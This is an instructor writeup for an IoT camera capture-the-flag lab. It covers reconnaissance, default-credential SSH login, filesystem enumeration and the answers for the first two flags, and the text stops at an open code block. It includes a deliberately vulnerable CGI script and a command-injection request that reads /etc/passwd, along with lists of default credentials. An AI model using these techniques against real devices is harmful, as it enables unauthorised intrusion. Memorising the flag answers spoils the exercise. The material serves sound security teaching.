# AXIS Camera IoT Security CTF - Instructor Writeup v6

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [IoT Penetration Testing Pedagogy](#iot-penetration-testing-pedagogy)
- [Initial Setup and Tool Installation](#initial-setup-and-tool-installation)
- [Initial Reconnaissance](#initial-reconnaissance)
- [Easy Flags](#easy-flags)
- [Medium Flags](#medium-flags)
- [Hard Flags](#hard-flags)

---

## Challenge Overview

**Target System**: AXIS Network Camera (Embedded Linux/BusyBox)  
**IP Address**: 192.168.1.132  
**Attacker System**: Kali Linux 192.168.1.133  
**Total Flags**: 27 (5 Easy, 13 Medium, 9 Hard)  
**Writable Directories**: 8 locations (/mnt/flash, /dev/shm, /run, /sys/fs/cgroup, /var, /var/cache/recorder, /var/lib/persistent, /usr/local)  
**Focus**: OWASP IoT Top 10 vulnerabilities in embedded camera systems

---

## IoT Penetration Testing Pedagogy

### Teaching Philosophy for IoT Security

This section provides instructors with comprehensive pedagogical frameworks for teaching IoT penetration testing. The methodologies outlined here emphasize the fundamental differences between traditional IT security testing and IoT-specific security assessments.

### Core Differences: IoT vs Traditional Systems

#### Architectural Constraints

**Traditional Systems (Workstations/Servers)**:
- Full-featured operating systems (Windows, Linux distributions)
- Gigabytes to terabytes of storage
- Powerful multi-core processors
- Extensive RAM (4GB+)
- Standard package managers and software ecosystems
- Regular patching cycles
- Full development toolchains available

**IoT/Embedded Systems**:
- Minimal operating systems (BusyBox, stripped Linux kernels)
- Megabytes to low gigabytes of storage
- Single-core or limited processors
- Minimal RAM (often under 512MB)
- Custom or no package managers
- Infrequent or impossible patching
- Limited or no compilation tools on device

**Teaching Approach**: Have students document resource constraints they discover during initial reconnaissance. This builds awareness that many traditional exploitation techniques won't work due to missing dependencies, insufficient storage, or CPU limitations.

#### Filesystem Behavior Patterns

**Traditional Systems**:
- Standard FHS (Filesystem Hierarchy Standard)
- Predictable directory structures
- Extensive logging to /var/log
- Configuration in /etc
- User data in /home

**IoT Systems**:
- Vendor-specific directory structures
- Minimal logging (storage constraints)
- Configurations scattered across multiple locations
- No traditional user home directories
- Heavy use of tmpfs and RAM-based filesystems
- Limited writable locations

**Teaching Approach**: Students must learn to identify writable locations first, then systematically enumerate each location. Traditional assumptions about where data resides don't apply. Emphasize the importance of understanding mount points and filesystem types (tmpfs, squashfs, jffs2, etc.).

#### Security Model Differences

**Traditional Systems**:
- Multi-user environments
- Complex permission models
- SELinux/AppArmor implementations
- Privilege separation expected
- User account management

**IoT Systems**:
- Often single-user (root only)
- Simplified permissions
- Minimal or no MAC implementations
- Everything runs as root
- No traditional user accounts

**Teaching Approach**: This represents both opportunity and challenge. While lack of privilege separation may seem to make exploitation easier, it also means students must think differently about lateral movement and persistence. There's often nowhere to "move laterally" to.

### IoT-Specific Enumeration Methodology

#### Phase 1: Resource Constraint Discovery

**Methodology**: Before attempting any exploitation, students must understand the target's limitations.

**Key Commands**:
```bash
# Memory constraints
cat /proc/meminfo
free -h

# Storage constraints  
df -h
cat /proc/mtd  # Flash memory partitions

# CPU constraints
cat /proc/cpuinfo
uptime  # Load averages reveal capacity

# Kernel and OS version
uname -a
cat /etc/os-release
cat /proc/version

# Available commands
ls /bin /sbin /usr/bin /usr/sbin | wc -l
which python python3 perl gcc make
```

**Instructor Notes**: Students often try to upload tools or scripts that won't run due to missing interpreters or libraries. Teaching them to inventory available resources first prevents frustration and mimics real-world methodology.

**Real-World Context**: In actual IoT pentests, you may need to:
- Cross-compile binaries for the target architecture
- Use shell-only exploits (no Python/Perl available)
- Work within extreme storage constraints
- Avoid crashing devices with limited memory

#### Phase 2: Writable Location Discovery

**Methodology**: IoT devices typically have most of the filesystem as read-only. Identifying writable locations is critical for:
- Storing enumeration results
- Placing exploit payloads
- Establishing persistence
- Staging exfiltrated data

**Discovery Process**:
```bash
# Method 1: Mount point analysis
mount | awk '$4 ~ /rw/ || $3 ~ /tmpfs|vfat/ {print}'

# Method 2: Direct testing
for dir in / /tmp /var /mnt /dev/shm /run /sys /proc /usr /opt /home; do
    touch "$dir/.test" 2>/dev/null && echo "$dir is writable" && rm "$dir/.test"
done

# Method 3: Filesystem examination
df -h | awk 'NR==1 || !/tmpfs/ {print}'
cat /proc/mounts | awk '$4 ~ /rw/ {print}'
```

**Teaching Nuance**: Not all "writable" locations are equally useful:
- `/dev/shm` is RAM-based and non-persistent (clears on reboot)
- `/tmp` may also be tmpfs
- `/var` might be on flash storage with limited write cycles
- `/mnt/flash` often has configuration persistence
- `/sys/fs/cgroup` is writable but special-purpose

**Instructor Demonstration**: Show students how to test write capabilities and persistence by creating a test file, rebooting, and checking if it still exists.

#### Phase 3: Vendor-Specific Structure Recognition

**Methodology**: Each IoT vendor has unique directory structures and naming conventions. Students must learn to recognize patterns.

**AXIS-Specific Patterns**:
```bash
# AXIS typically uses:
/var/lib/axis/          # Primary configuration location
/usr/local/axis/        # Custom applications and scripts
/mnt/flash/             # Persistent storage
/var/cache/recorder/    # Video recording cache
```

**General IoT Patterns**:
```bash
# Common across vendors:
/opt/vendor_name/       # Custom application directory
/config/                # Alternative to /etc
/userdata/              # User-configurable storage
/firmware/              # Firmware images and updates
```

**Teaching Approach**: Have students create a "directory significance map" documenting what each location contains and its security implications. This builds pattern recognition for future IoT assessments.

### Data Extraction Methodology for IoT

#### Understanding IoT Data Types

**Methodology**: IoT devices store fundamentally different data than traditional systems.

**Traditional Systems Store**:
- User documents
- Application data
- Email and communications
- Browser history
- Installed applications

**IoT Devices Store**:
- Sensor readings and telemetry
- Device configuration and calibration data
- Firmware and bootloader configs
- Network credentials and certificates
- Operational logs and metrics
- Device-specific secrets (API keys, tokens)

#### Configuration File Analysis

**Methodology**: Configuration files in IoT devices often contain more sensitive information than in traditional systems because:
- No secure credential storage mechanisms
- Hard-coded defaults for deployment ease
- Debug information left in production
- Integration tokens for cloud services

**Systematic Approach**:
```bash
# Phase 1: Find all configuration files
find /var /mnt/flash /usr/local /etc -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null

# Phase 2: Identify vendor-specific configs
find /var/lib/axis -type f 2>/dev/null
find /usr/local/axis -type f 2>/dev/null

# Phase 3: Read and analyze each file
# Students should read files completely, not just search for flags
```

**Critical Teaching Point**: Train students to READ files completely rather than using automated searches. The command `cat /path/to/file` followed by manual analysis teaches:
- Understanding context around sensitive data
- Recognition of encoding/obfuscation
- Identification of related configuration items
- Pattern recognition for future assessments

**Why Not Pattern Matching**: While `find / -type f -exec strings {} + | awk '/FLAG\{/' 2>/dev/null` would find flags quickly, this approach:
- Doesn't teach file system navigation
- Misses context around sensitive data
- Doesn't develop pattern recognition
- Isn't realistic (real pentesters don't know the format of secrets)
- Doesn't teach students to recognize what's sensitive

#### Log File Analysis for IoT

**Methodology**: IoT logging differs significantly from traditional systems.

**Traditional System Logs**:
- Extensive logging to /var/log/*
- Log rotation and archival
- Centralized syslog
- Detailed application logs

**IoT System Logs**:
- Minimal logging (storage constraints)
- Often only in RAM (non-persistent)
- Circular buffers (overwrite old data)
- Limited log detail
- May log to serial console instead of files

**Analysis Approach**:
```bash
# Identify logging locations
find /var/log -type f 2>/dev/null
ls -la /var/log/

# Check for RAM-based logs
dmesg | head -50
logread  # BusyBox syslog reader

# Check runtime logs
cat /run/axis/*.log 2>/dev/null
cat /dev/shm/axis/*.log 2>/dev/null
```

**Teaching Nuance**: On IoT devices, logs often contain:
- Service startup information with version numbers
- Configuration parsing errors revealing file locations
- Network connection attempts with credentials
- Debug output left in production
- Device identifiers and serial numbers

**Instructor Demonstration**: Show students how log file analysis in IoT differs from traditional systems. The limited storage means logs are more selective and what IS logged tends to be more significant.

### Embedded Web Interface Exploitation

#### IoT Web Interface Characteristics

**Methodology**: IoT web interfaces are fundamentally different from modern web applications.

**Modern Web Applications**:
- Frameworks (React, Angular, Django, Rails)
- Database backends
- Session management
- Complex authentication systems
- RESTful APIs

**IoT Web Interfaces**:
- Static HTML/JavaScript
- Lightweight HTTP servers (BusyBox httpd, lighttpd)
- CGI scripts in C or shell
- Basic or digest authentication
- Proprietary API endpoints
- Minimal client-side security

**Security Implications**:
```bash
# Common IoT web vulnerabilities:

# 1. CGI Command Injection
# Traditional web apps use frameworks that sanitize input
# IoT CGI scripts often directly pass parameters to shell

# 2. Path Traversal
# Minimal web servers may not properly restrict file access
# Directory indexing often enabled

# 3. Information Disclosure
# HTML comments with sensitive data
# Debug endpoints left enabled
# Source code in client-side JavaScript
```

**Teaching Approach**: Have students compare the source code of an IoT web interface to a modern web application. The differences are striking and reveal why IoT web security requires different assessment techniques.

#### CGI Script Analysis

**Methodology**: CGI scripts in IoT devices are prime targets because they bridge web input to system commands.

**Analysis Process**:
```bash
# Locate CGI scripts
find /usr/lib/cgi-bin /www/cgi-bin /var/www/cgi-bin -type f 2>/dev/null

# Examine script permissions
ls -la /usr/lib/cgi-bin/

# Read script content
cat /usr/lib/cgi-bin/check_user.cgi

# Identify dangerous patterns:
# - system() calls with user input
# - exec() with unsanitized parameters  
# - File operations without path validation
# - SQL queries with string concatenation
```

**Real-World Example Walkthrough**: Examine a vulnerable CGI script:
```c
#!/bin/sh
# check_user.cgi
echo "Content-type: text/html"
echo ""

USER=$1
ping -c 1 $USER
```

**Vulnerability Analysis**:
- No input validation
- Direct parameter usage in system command
- No output sanitization

**Exploitation**:
```bash
# Command injection:
curl "http://192.168.1.132/cgi-bin/check_user.cgi?192.168.1.1;cat%20/etc/passwd"

# This executes:
ping -c 1 192.168.1.1;cat /etc/passwd
```

**Teaching Points**:
- IoT CGI scripts often written by embedded developers, not web security experts
- Performance constraints lead to minimal input validation
- Testing and QA for embedded devices often focuses on functionality, not security
- Attack surface is well-defined (enumerate CGI endpoints completely)

### Binary and Firmware Analysis

#### IoT Binary Characteristics

**Methodology**: Binaries on IoT devices require different analysis techniques than traditional software.

**Traditional Binaries**:
- Dynamically linked to system libraries
- Debug symbols often present
- Standard compilation flags
- Multiple architectures available

**IoT Binaries**:
- Often statically linked (minimal dependencies)
- Stripped of symbols (size optimization)
- Cross-compiled for specific architectures (ARM, MIPS)
- Custom toolchains
- Aggressive optimization that complicates disassembly

**Analysis Approach**:
```bash
# Step 1: Identify binary architecture
file /usr/sbin/axis_application

# Step 2: Check for strings (often most effective approach)
strings /usr/sbin/axis_application > app_strings.txt

# Step 3: Look for interesting patterns in strings output
# Read through the file systematically
cat app_strings.txt

# Look for:
# - Configuration file paths
# - API endpoints
# - Error messages
# - Debug strings
# - Hard-coded credentials
# - URLs and IP addresses
```

**Teaching Critical Point**: On IoT devices, `strings` analysis is often more productive than disassembly because:
- Cross-architecture disassembly tools may not be available
- Binaries are optimized making analysis difficult
- Interesting data (paths, URLs, tokens) appears in strings
- It's faster and doesn't require advanced reverse engineering

**Instructor Demonstration**: Show students how to systematically analyze strings output:
1. Read from beginning to end
2. Note patterns and repeated strings
3. Identify configuration paths
4. Look for encoding (base64, hex)
5. Recognize API tokens and keys

#### Firmware Image Analysis

**Methodology**: Firmware images contain the complete filesystem and bootloader.

**Analysis Process**:
```bash
# Step 1: Locate firmware images
find /mnt/flash /var/lib -name "*.bin" -o -name "*.img" -o -name "firmware*" 2>/dev/null

# Step 2: Identify firmware type
file firmware.bin
binwalk firmware.bin

# Step 3: Extract strings without extraction
strings -n 10 firmware.bin > firmware_strings.txt

# Step 4: Analyze strings output
cat firmware_strings.txt
# Look for file system paths, configuration directives, keys

# Step 5: Look for common firmware signatures
hexdump -C firmware.bin | head -20
# Look for magic bytes: 
# - SquashFS: hsqs
# - JFFS2: 0x85, 0x19
# - U-Boot: 0x27051956
```

**Teaching Approach**: Firmware analysis reveals:
- Default credentials hard-coded in filesystem
- Debug backdoors
- Cryptographic keys
- API tokens
- Configuration templates
- Update mechanisms

**Real-World Context**: In production IoT pentests, firmware analysis often reveals vulnerabilities applicable to entire product lines, not just single devices. A hard-coded key in firmware affects all devices running that firmware version.

### Encoding vs Encryption Recognition

**Methodology**: IoT devices frequently use encoding (not encryption) for "security."

**Critical Teaching Point**: Many students confuse encoding with encryption. This distinction is vital for IoT security.

**Encoding**:
- Reversible without a key
- Examples: Base64, Base32, Hex, ROT13, URL encoding
- Purpose: Data representation, not security
- Can be decoded by anyone

**Encryption**:
- Requires a key to reverse
- Examples: AES, RSA, 3DES
- Purpose: Security and confidentiality
- Cannot be easily reversed without key

**Recognition Patterns**:
```bash
# Base64 indicators:
# - Ends with = or ==
# - Only uses: A-Z, a-z, 0-9, +, /, =
# - Length is multiple of 4
# Example: VXNlcjpBZG1pbg==

# Hex encoding indicators:
# - Only 0-9, A-F, a-f
# - Often even length
# Example: 48656c6c6f

# ROT13 indicators:
# - Looks like garbled English
# - Letter frequency similar to English
# Example: Uryyb Jbeyq (Hello World)

# URL encoding:
# - Contains % followed by hex digits
# Example: %48%65%6c%6c%6f

# Binary/octal:
# - Only 0-1 (binary) or 0-7 (octal)
# Example: 01001000 01100101 01101100 01101100 01101111
```

**Teaching Exercise**: Present students with various encoded strings and have them:
1. Identify the encoding method
2. Decode without tools first (understanding the pattern)
3. Verify with tools

**Why This Matters in IoT**: IoT devices often use encoding (especially Base64 and ROT13) for passwords and tokens in configuration files. Developers mistakenly believe this provides security. Students must recognize that finding encoded data is equivalent to finding plaintext.

**Decoding Methodology**:
```bash
# Base64 decoding
echo "VXNlcjpBZG1pbg==" | base64 -d

# Hex to ASCII
echo "48656c6c6f" | xxd -r -p

# ROT13 (no standard tool, use tr)
echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# URL decoding
echo "%48%65%6c%6c%6f" | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()))"
```

### Runtime Service Analysis

**Methodology**: IoT devices run minimal services, but each is significant.

**Discovery Process**:
```bash
# Identify running processes
ps aux
ps -ef

# Network service enumeration
netstat -tulpn
ss -tulpn

# Check listening services
lsof -i

# Service configuration locations
find /etc/init.d /etc/rc.d -type f 2>/dev/null
ls -la /run/axis/
```

**Analysis Focus Areas**:

**Service Configuration Files**:
```bash
# Services store runtime data in /run (tmpfs)
ls -la /run/axis/
cat /run/axis/vapix.pid
cat /run/axis/services.conf
```

**Teaching Point**: Runtime directories (/run, /var/run) contain:
- Process IDs (PIDs)
- Socket files
- Service state information
- Temporary credentials
- Session tokens
- Active configuration snapshots

**Real-World Significance**: These locations are often overlooked because they're temporary, but they contain current operational data that may include:
- Active session tokens
- Currently authenticated users
- Real-time configuration that differs from persistent config
- Credentials in memory

### Shared Memory Analysis

**Methodology**: Shared memory (/dev/shm) is critical in IoT for inter-process communication.

**Why Shared Memory Matters in IoT**:
- Limited RAM requires efficient IPC
- File-based IPC too slow for real-time operations
- Multiple processes share sensor data
- Temporary credential storage
- Debug data during development left in production

**Analysis Approach**:
```bash
# Enumerate shared memory
ls -la /dev/shm/
ls -laR /dev/shm/axis/

# Identify temporary files
find /dev/shm -type f 2>/dev/null

# Check file contents systematically
for file in $(find /dev/shm -type f 2>/dev/null); do
    echo "=== $file ==="
    cat "$file"
done
```

**Teaching Critical Point**: Shared memory is:
- RAM-based (fast, volatile)
- World-readable by default on many systems
- Used for IPC between components
- Often contains sensitive temporary data
- Cleared on reboot

**Security Implications**:
- Credentials passed between processes
- Sensor data before encryption
- Debug information
- Temporary tokens
- Race condition vulnerabilities

### Advanced: Bootloader and Hardware Analysis

#### U-Boot Configuration Analysis

**Methodology**: Bootloaders often contain critical security settings and backdoors.

**Analysis Process**:
```bash
# Locate U-Boot environment
find /mnt/flash -name "uboot*" -o -name "u-boot*" 2>/dev/null

# Read environment variables
cat /mnt/flash/uboot_env.txt

# Look for critical settings:
# - secure_boot=enabled/disabled
# - bootargs (kernel parameters)
# - bootcmd (boot command sequence)
# - ethaddr (MAC address)
# - serverip (TFTP server for updates)
```

**Critical Security Settings**:
```bash
# Insecure bootloader indicators:
secure_boot=disabled       # Allows unsigned firmware
bootdelay=3               # Allows boot interruption
bootcmd=bootm 0x40000000  # Allows modification

# Debug/Recovery modes:
altbootcmd=...            # Alternative boot path
rescue_mode=enabled       # Recovery mode available
```

**Teaching Point**: Bootloader access often provides:
- Ability to modify kernel parameters
- Bypass security mechanisms
- Load alternative firmware
- Access to hardware debug interfaces
- Root filesystem modification

**Real-World Context**: In production environments, unlocked bootloaders allow:
- Persistent firmware backdoors
- Bypassing secure boot
- Loading malicious firmware
- Extracting proprietary firmware

#### JTAG and Hardware Debug Interfaces

**Methodology**: Hardware debug interfaces bypass software security.

**Identification**:
```bash
# Check for JTAG configuration
find /sys -name "*jtag*" 2>/dev/null
dmesg | awk '/[jJ][tT][aA][gG]/ {print}'

# Look for debug interfaces in hardware config
cat /proc/cpuinfo | awk 'tolower($0) ~ /debug/ {print}'
cat /sys/kernel/debug/* 2>/dev/null
```

**Teaching Point**: Hardware debug interfaces represent:
- Physical security boundary
- Often overlooked in security assessments
- Complete system access when enabled
- Difficult to patch/fix (hardware-based)

**Security Implications**:
- JTAG allows direct memory access
- Can bypass all software security
- Extract firmware directly
- Inject code into RAM
- Debug processor states

---

## Initial Setup and Tool Installation

### Required Tools and Installation

```bash
# Update Kali repositories first
sudo apt update

# Network Scanning and Enumeration
sudo apt install -y nmap
sudo apt install -y netcat-traditional
sudo apt install -y gobuster
sudo apt install -y nikto

# Web Application Testing
sudo apt install -y curl wget
sudo apt install -y burpsuite
sudo apt install -y dirb

# SNMP Tools
sudo apt install -y snmp snmpd snmp-mibs-downloader
# Enable MIBs
sudo sed -i 's/mibs :/# mibs :/g' /etc/snmp/snmp.conf

# RTSP and Multimedia
sudo apt install -y ffmpeg
sudo apt install -y vlc
# Install Cameradar for RTSP testing
git clone https://github.com/Ullaakut/cameradar.git
cd cameradar
sudo apt install -y golang
go build -o cameradar cmd/cameradar/main.go
sudo mv cameradar /usr/local/bin/

# Binary Analysis
sudo apt install -y binwalk
sudo apt install -y foremost
sudo apt install -y strings
sudo apt install -y hexdump

# Encoding/Decoding Tools
sudo apt install -y basenc

# Additional Utilities
sudo apt install -y hashcat
sudo apt install -y john
sudo apt install -y hydra

# ONVIF and UPnP Tools
pip3 install onvif_zeep
sudo apt install -y upnpc

# Create working directory for CTF
mkdir -p ~/ctf/axis_camera
cd ~/ctf/axis_camera
```

### Tool Verification

```bash
# Verify installations
nmap --version
gobuster version
ffmpeg -version
binwalk --help | head -5
hashcat --version
base64 --version

# Create wordlists if needed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
ls -la /usr/share/wordlists/
```

**Expected Output**:
```
Nmap version 7.94 ( https://nmap.org )
gobuster v3.6
ffmpeg version 6.0
binwalk v2.3.4
hashcat v6.2.6
base64 (GNU coreutils) 9.1
```

---

## Initial Reconnaissance

### Network Discovery and Port Scanning

**Teaching Methodology**: Port scanning in IoT environments requires understanding of typical IoT service patterns.

**IoT-Specific Considerations**:
- IoT devices often expose non-standard ports
- Services may be proprietary protocols
- Embedded web servers on unusual ports
- Device discovery protocols (UPnP, WS-Discovery)
- RTSP for camera streams
- MQTT for sensor data

```bash
# Verify target is alive
ping -c 3 192.168.1.132

# Comprehensive port scan
nmap -sV -sC -p- 192.168.1.132 -oA axis_full_scan
```

**Expected Output**:
```
Starting Nmap 7.94 scan at 2025-01-27 10:00:00 EST
Nmap scan report for 192.168.1.132
Host is up (0.00042s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:77:88:99:00 (RSA)
80/tcp   open  http     BusyBox httpd 1.31.0
|_http-title: AXIS Camera Interface
554/tcp  open  rtsp     AXIS Media Control
1883/tcp open  mqtt     Mosquitto version 1.6.12
1900/tcp open  upnp     Linux UPnP 1.0
3702/udp open  ws-discovery
8080/tcp open  http-proxy

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 45.32 seconds
```

**Instructor Teaching Points**:
- Always save scan results with `-oA` for documentation and later reference
- `-sC` runs default NSE scripts that may reveal additional information
- Full port scan `-p-` is critical as IoT devices may use non-standard ports
- Service version detection `-sV` helps identify outdated components

**Common Student Errors and Corrections**:
- **Error**: Forgetting to scan UDP ports
  - **Correction**: UDP scan with `-sU` reveals services like SNMP, WS-Discovery
  - **Teaching**: Many IoT discovery protocols use UDP
  
- **Error**: Not saving scan output
  - **Correction**: Use `-oA filename` to save in multiple formats
  - **Teaching**: Documentation is critical for reporting and later analysis
  
- **Error**: Running SYN scan without sudo
  - **Correction**: SYN scan requires root privileges
  - **Teaching**: Explain difference between TCP connect and SYN scans

**Port Analysis Discussion**:

**Port 22 (SSH)**:
- OpenSSH version reveals potential vulnerabilities
- Test for default credentials (common in IoT)
- May reveal device information in banner

**Port 80 (HTTP)**:
- BusyBox httpd indicates embedded Linux
- Lightweight web server with potential security weaknesses
- Check for CGI vulnerabilities

**Port 554 (RTSP)**:
- Real-Time Streaming Protocol for video
- May contain credentials in URLs
- Cameradar tool specifically designed for RTSP testing

**Port 1883 (MQTT)**:
- Message broker for IoT communication
- Often lacks authentication
- May contain sensor data and commands

**Port 1900 (UPnP)**:
- Universal Plug and Play for device discovery
- Frequently insecure
- May reveal device information without authentication

**Port 8080 (HTTP Proxy)**:
- Alternative web interface or API
- May have different authentication requirements
- Check if it bypasses main web interface security

### Initial SSH Access

**Teaching Methodology**: Default credentials are endemic in IoT devices.

**Why Default Credentials Persist in IoT**:
- Ease of deployment and initial setup
- Assumption of physical security
- Difficulty of remote credential changes
- Legacy devices never updated
- Documentation includes defaults

```bash
# Try default AXIS credentials
ssh root@192.168.1.132
# Password: pass
```

**Expected Output**:
```
BusyBox v1.31.0 (2024-01-01 00:00:00 UTC) built-in shell (ash)

     ___   __   __  _____  _____
    / _ \  \ \ / / |_   _|/ ____|
   / /_\ \  \ V /    | | | (___
  /  ___  \  > <     | |  \___ \
 / /    \  \/ . \   _| |_ ____) |
/_/      \_/_/ \_\ |_____|_____/  Camera System

root@axis:~#
```

**Instructor Discussion Points**:
- Default credentials: root/pass, admin/admin, root/root, admin/password
- Why vendors use defaults (manufacturing, support, RMA)
- Why users don't change them (awareness, complexity, forgotten)
- Impact: Complete system compromise from initial access

**Real-World Context**:
- Shodan shows millions of IoT devices with default credentials
- Mirai botnet exploited default credentials en masse
- Many CVEs are simply "default credentials exist"

### Filesystem Enumeration Strategy

**Teaching Methodology**: Systematic enumeration is critical for IoT penetration testing.

**Instructor Demonstration**: Show students the complete process of understanding the filesystem before looking for specific items.

#### Step 1: Understand Storage Architecture

```bash
# View mounted filesystems
mount | awk '$4 ~ /rw/ {print}'

# Check disk usage and capacity
df -h

# Identify flash storage partitions
cat /proc/mtd
```

**Expected Output**:
```
Filesystem                Size      Used Available Use% Mounted on
/dev/root                50.0M     30.0M     20.0M  60% /
tmpfs                    64.0M      2.0M     62.0M   3% /dev/shm
/dev/mmcblk0p3          500.0M    100.0M    400.0M  20% /var
/dev/mmcblk0p4          200.0M     50.0M    150.0M  25% /mnt/flash
```

**Teaching Analysis**:
- `/dev/root`: Read-only root filesystem (squashfs)
- `tmpfs`: RAM-based, non-persistent
- `/dev/mmcblk0p3`: Persistent storage for /var
- `/dev/mmcblk0p4`: Flash storage for configuration

#### Step 2: Identify Writable Locations

**Methodology**: Students must test each location, not assume writability.

```bash
# List all mount points showing read-write status
mount | awk '$4 ~ /rw/ || $3 ~ /tmpfs|vfat/ {print}'

# Test write access to key directories
for dir in /tmp /var /mnt/flash /dev/shm /run /sys/fs/cgroup /usr/local; do
    if touch "$dir/.writetest" 2>/dev/null; then
        echo "[+] $dir is writable"
        rm "$dir/.writetest"
    else
        echo "[-] $dir is not writable"
    fi
done
```

**Expected Results**:
```
[+] /dev/shm is writable
[+] /run is writable
[+] /sys/fs/cgroup is writable
[+] /var is writable
[+] /mnt/flash is writable
[+] /usr/local is writable
```

#### Step 3: Enumerate Each Writable Location Systematically

**Teaching Critical Point**: Students should enumerate locations in order of:
1. Likelihood of containing sensitive data
2. Persistence (persistent storage before temporary)
3. Vendor-specific locations before standard locations

**Enumeration Process**:

```bash
# Create enumeration script
cat > enum_writables.sh << 'EOF'
#!/bin/sh
# Systematic writable directory enumeration

echo "=== /mnt/flash ==="
find /mnt/flash -type f 2>/dev/null | while read file; do
    echo "File: $file"
done

echo ""
echo "=== /var/lib/persistent ==="
find /var/lib/persistent -type f 2>/dev/null | while read file; do
    echo "File: $file"
done

echo ""
echo "=== /var/cache/recorder ==="
find /var/cache/recorder -type f 2>/dev/null | while read file; do
    echo "File: $file"
done

echo ""
echo "=== /usr/local/axis ==="
find /usr/local/axis -type f 2>/dev/null | while read file; do
    echo "File: $file"
done

echo ""
echo "=== /dev/shm ==="
ls -laR /dev/shm/ 2>/dev/null

echo ""
echo "=== /run/axis ==="
ls -laR /run/axis/ 2>/dev/null

echo ""
echo "=== /sys/fs/cgroup ==="
find /sys/fs/cgroup -type f 2>/dev/null | head -20
EOF

chmod +x enum_writables.sh
./enum_writables.sh
```

**Instructor Teaching Point**: This systematic approach ensures nothing is missed. Students often jump to specific directories they think are interesting, missing critical data in unexpected locations.

---

## Easy Flags

**Teaching Approach for Easy Flags**: These flags introduce fundamental concepts of IoT filesystem enumeration and configuration file analysis. Students should learn to read files completely rather than searching for flag patterns.

### Flag #1: Default VAPIX Configuration

**Location**: `/var/lib/axis/conf/vapix.conf`  
**Flag**: `FLAG{FRODO27189846}`  
**OWASP Category**: IoT-09 (Insecure Default Settings)

**Teaching Methodology**:

**Concept**: VAPIX (Video API for AXIS cameras) configuration files contain device-specific settings and identifiers.

**Real-World Context**: In actual AXIS camera pentests, vapix.conf contains:
- API version and supported features
- Device model and firmware version
- Serial numbers
- Network configuration
- Authentication realm information

**Systematic Discovery Process**:

```bash
# Step 1: Understand configuration file locations
ssh root@192.168.1.132
ls -la /var/lib/axis/

# Step 2: Identify configuration directory
ls -la /var/lib/axis/conf/

# Step 3: Enumerate all configuration files
find /var/lib/axis -name "*.conf" 2>/dev/null
```

**Expected Output**:
```
/var/lib/axis/conf/vapix.conf
/var/lib/axis/conf/hardware_debug.conf
/var/lib/axis/conf/network.conf
/var/lib/axis/conf/system.conf
```

**Step 4: Read the VAPIX configuration file**:

```bash
cat /var/lib/axis/conf/vapix.conf
```

**Expected Output**:
```
# AXIS VAPIX API Configuration v3.0
# Generated: 2024-01-01 12:00:00

[Network]
api_version=3.0
protocol=http,https
port=80,443

[Authentication]
method=digest
realm=AXIS_ACCC8E

[Device]
model=M1025
firmware=10.5.0
serial=ACCC8E-FLAG{FRODO27189846}
build_date=2024-01-01

[Features]
motion_detection=enabled
audio=disabled
ptz=disabled
```

**Instructor Analysis Discussion**:

**What Students Should Learn**:
1. Vendor-specific directory structures (/var/lib/axis)
2. Configuration file naming conventions (*.conf)
3. Serial numbers may contain sensitive identifiers
4. Configuration files reveal device capabilities

**Why This Information Matters**:
- Serial numbers identify specific device instances
- Firmware versions reveal known vulnerabilities
- API versions determine available attack surface
- Feature flags show enabled/disabled functionality

**Common Student Mistakes**:
- Looking only in /etc for configuration files
- Not checking vendor-specific directories
- Not reading files completely (only scanning for flags)
- Forgetting to use `2>/dev/null` to suppress permission errors

**Real-World Exploitation**:
- Serial numbers used for device tracking
- Firmware versions mapped to CVE databases
- API versions determine exploit compatibility
- Authentication realms used in credential attacks

**Extended Teaching**:

Have students analyze each section of the configuration:

**[Network] Section**:
- Shows API is available on ports 80 and 443
- Multiple protocols mean multiple attack vectors
- Version 3.0 may have known vulnerabilities

**[Authentication] Section**:
- Digest authentication (not basic, more secure)
- Realm "AXIS_ACCC8E" used in authentication challenges
- May be useful for rainbow table attacks

**[Device] Section**:
- Model M1025 has specific known vulnerabilities
- Firmware 10.5.0 may be outdated
- Serial number format reveals manufacturing patterns

**[Features] Section**:
- Disabled features reduce attack surface
- Motion detection may have API endpoints
- PTZ (pan-tilt-zoom) disabled means fewer CGI scripts

---

### Flag #2: SSH Banner in System Log

**Location**: `/var/log/messages`  
**Flag**: `FLAG{GIMLI42137246}`  
**OWASP Category**: IoT-02 (Insecure Network Services)

**Teaching Methodology**:

**Concept**: System logs in IoT devices contain service startup information that may include sensitive identifiers.

**Why Logs Matter in IoT**:
- Limited storage means selective logging
- What IS logged tends to be significant
- Service startup logs reveal configuration
- Debug information often left in production
- Logs may contain credentials or tokens

**Real-World Context**: IoT device logs are often overlooked because:
- Analysts assume limited logging means uninteresting logs
- Focus on persistent storage over temporary logs
- Traditional /var/log/* analysis patterns don't apply
- Logs may be in unusual locations

**Discovery Process**:

```bash
# Step 1: Identify log file locations
ssh root@192.168.1.132
ls -la /var/log/

# Step 2: Understand logging on embedded systems
cat /var/log/messages
```

**Expected Output**:
```
Jan  1 12:00:01 axis-camera syslogd: syslogd started: BusyBox v1.31.1
Jan  1 12:00:05 axis-camera kernel: Linux version 4.9.0-axis1 (build@axis.com)
Jan  1 12:00:10 axis-camera sshd[234]: Server listening on 0.0.0.0 port 22
Jan  1 12:00:11 axis-camera sshd[234]: Device-ID: FLAG{GIMLI42137246}
Jan  1 12:00:15 axis-camera network: eth0: link up
Jan  1 12:00:20 axis-camera vapix: VAPIX API started on port 80
Jan  1 12:00:25 axis-camera rtsp: RTSP server initialized
```

**Instructor Analysis Discussion**:

**Log File Structure Analysis**:
1. **Timestamp**: Jan 1 12:00:01
2. **Hostname**: axis-camera
3. **Service**: sshd, kernel, network, vapix
4. **Message**: Service-specific information

**Teaching Points**:

**Service Startup Sequence**:
- syslogd starts first (logging daemon)
- kernel messages show Linux version
- sshd starts and logs device ID
- Network services initialize
- Application services start last

**Why Device IDs in Logs**:
- Debugging multi-device deployments
- Identifying device in centralized logging
- Support and warranty tracking
- Often contains sensitive information

**What Else to Look For in IoT Logs**:
```bash
